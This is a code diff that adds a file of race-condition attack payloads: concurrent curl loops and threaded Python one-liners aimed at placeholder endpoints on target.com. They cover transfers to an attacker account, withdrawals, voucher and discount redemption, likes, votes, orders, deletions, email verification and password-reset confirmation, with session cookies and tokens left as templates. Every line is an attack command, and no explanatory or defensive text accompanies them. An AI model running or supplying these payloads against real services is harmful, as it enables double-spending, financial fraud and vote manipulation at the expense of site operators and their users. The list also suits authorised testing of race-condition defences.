@@ -1,0 +1,22 @@
+curl -s -X POST https://target.com/api/transfer -d '{"to":"{attacker}","amount":100}' -b "session={session}" & curl -s -X POST https://target.com/api/transfer -d '{"to":"{attacker}","amount":100}' -b "session={session}" & curl -s -X POST https://target.com/api/transfer -d '{"to":"{attacker}","amount":100}' -b "session={session}" & wait
+for i in $(seq 1 20); do curl -s -X POST https://target.com/api/redeem -d '{"code":"{voucher}"}' -b "session={session}" & done; wait
+for i in $(seq 1 10); do curl -s -X POST https://target.com/api/withdraw -d '{"amount":100}' -b "session={session}" & done; wait
+curl -s -X POST https://target.com/api/like -d '{"post_id":1}' -b "session={session}" & curl -s -X POST https://target.com/api/like -d '{"post_id":1}' -b "session={session}" & curl -s -X POST https://target.com/api/like -d '{"post_id":1}' -b "session={session}" & wait
+curl -s -X POST https://target.com/api/vote -d '{"item_id":1}' -b "session={session}" & curl -s -X POST https://target.com/api/vote -d '{"item_id":1}' -b "session={session}" & wait
+python3 -c "import threading,requests; [threading.Thread(target=lambda:requests.post('https://target.com/api/transfer',json={'to':'attacker','amount':100},cookies={'session':'{session}'})).start() for _ in range(20)]"
+python3 -c "import threading,requests; [threading.Thread(target=lambda:requests.post('https://target.com/api/apply-discount',json={'code':'{code}'},cookies={'session':'{session}'})).start() for _ in range(20)]"
+python3 -c "import threading,requests; [threading.Thread(target=lambda:requests.post('https://target.com/api/register',json={'email':'race@test.com','password':'test'},)).start() for _ in range(10)]"
+curl -s -X POST https://target.com/api/verify-email -d '{"token":"{token}"}' -b "session={session}" & curl -s -X POST https://target.com/api/verify-email -d '{"token":"{token}"}' -b "session={session}" & wait
+for i in $(seq 1 10); do curl -s -X POST https://target.com/api/order -d '{"item_id":1,"quantity":1}' -b "session={session}" & done; wait
+for i in $(seq 1 10); do curl -s -X DELETE https://target.com/api/resource/{id} -b "session={session}" & done; wait
+curl -s -X POST https://target.com/api/password-reset-confirm -d '{"token":"{token}","password":"pass1"}' & curl -s -X POST https://target.com/api/password-reset-confirm -d '{"token":"{token}","password":"pass2"}' & wait
+for i in $(seq 1 50); do curl -s https://target.com/api/limited-resource -b "session={session}" & done; wait
+python3 -c "
+import threading, requests
+url = 'https://target.com/api/check-and-spend'
+cookies = {'session': '{session}'}
+data = {'amount': 100}
+threads = [threading.Thread(target=lambda: requests.post(url, json=data, cookies=cookies)) for _ in range(20)]
+[t.start() for t in threads]
+[t.join() for t in threads]
+"
